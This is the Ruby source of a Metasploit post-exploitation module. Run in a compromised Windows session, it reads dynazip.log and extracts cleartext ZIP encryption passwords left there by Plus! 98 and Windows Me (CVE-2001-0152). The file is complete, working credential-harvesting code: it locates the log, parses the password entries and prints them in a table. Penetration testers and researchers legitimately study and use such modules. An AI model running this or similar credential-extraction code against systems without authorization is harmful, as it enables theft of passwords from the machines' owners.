##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Windows Gather DynaZIP Saved Password Extraction',
      'Description'    => %q{
        This module extracts clear text credentials from dynazip.log.
        The log file contains passwords used to encrypt compressed zip
        files in Microsoft Plus! 98 and Windows Me.
      },
      'License'        => MSF_LICENSE,
      'Author'         => ['bcoles'],
      'References'     =>
        [
          ['CVE', '2001-0152'],
          ['MSB', 'MS01-019'],
          ['PACKETSTORM', '24543'],
          ['URL', 'https://support.microsoft.com/en-us/kb/265131']
        ],
      'DisclosureDate' => 'Mar 27 2001',
      'Platform'       => ['win'],
      'SessionTypes'   => ['meterpreter', 'shell']
    ))
  end

  def run
    creds = []

    log_path = "#{get_env("%WINDIR%")}\\dynazip.log"

    unless file?(log_path)
      print_error("#{log_path} not found")
      return
    end

    print_good("Found DynaZip log file: #{log_path}")

    begin
      log_data = read_file(log_path)
    rescue EOFError
      print_error('Log file is empty')
      return
    end

    vprint_status("Processing log file (#{log_data.length} bytes)")

    log_data.split('- DynaZIP ZIP Diagnostic Log -').each do |log|

      if log =~ /^lpszZIPFile: 0x[0-9a-f]+\s*?^(.+)\r\n/
        zip_path = $1
      else
        next
      end

      vprint_status("Processing log entry for #{zip_path}")

      # The lpszEncryptCode appears to always be 0x712185d4 however
      # we use a hex regex pattern, just in case.
      # The line following the lpszEncryptCode contains the password.
      passwd = log.scan(/^lpszEncryptCode: 0x[0-9a-f]+\s*?^(.+)?\r\n/).flatten.first

      # In the event that the user selected a blank encryption password
      # the ZIP file is not encrypted, however an empty line is written
      # to the log file.
      if passwd.to_s.eql?('')
        vprint_status('Did not find a password')
        next
      end

      print_good("File: '#{zip_path}' -- Password: '#{passwd}'")
      creds << [zip_path, passwd]
    end

    if creds.empty?
      print_error('No passwords were found in the log file')
      return
    end

    table = Rex::Text::Table.new(
      'Header'    => 'ZIP Passwords',
      'Indent'    => 0,
      'SortIndex' => 0,
      'Columns'   => ['File Path', 'Password']
    )
    creds.each {|c| table << c }
    print_line
    print_line(table.to_s)
  end
end
